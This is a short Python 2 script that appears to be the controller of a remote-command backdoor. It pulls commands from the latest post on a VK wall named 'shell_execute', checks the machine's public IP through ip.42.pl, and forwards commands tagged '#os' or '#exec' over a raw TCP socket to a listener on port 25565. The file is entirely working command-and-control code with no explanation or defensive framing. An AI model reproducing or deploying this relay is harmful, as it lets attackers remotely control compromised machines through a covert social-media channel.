from socket import *
import sys
import vk_api
from urllib2 import urlopen
ip = urlopen('http://ip.42.pl/raw').read()

def refresh():
    vk_session = vk_api.VkApi()
    vk = vk_session.get_api()

    response = vk.wall.get(count=1, domain='shell_execute')  # get command from wall
    global cmd
    cmd = response['items'][0]['text']

def r():
    r = raw_input('#: ')
    if r == 'send': sendData()
    elif r == 'refresh': refresh()
    elif r == 'exit': sys.exit(1)
    elif r == 'shutdown': sh = 1

def sendData():
    refresh()
    host = '127.0.0.1'
    port = 25565
    addr = (host,port)


    tcp_socket = socket(AF_INET, SOCK_STREAM)
    tcp_socket.connect(addr)

    if cmd:
        if '#os' in cmd:
            print('[DEBUG]' + cmd) # print the command which you send
            data = cmd # //raw_input('write to server: ')
            tcp_socket.send(data)
            tcp_socket.recv(1024)
            r()
        elif '#exec' in cmd:
            print('[DEBUG]' + cmd) # debug
            data = cmd # data to cmd
            tcp_socket.send(data)
            tcp_socket.recv(1024)
            r()
        else:
            print 'Error id'
            sys.exit(1)
        if not data :
            #tcp_socket.close()
            sys.exit(1)
    else:
        print 'Have not data'



sendData()
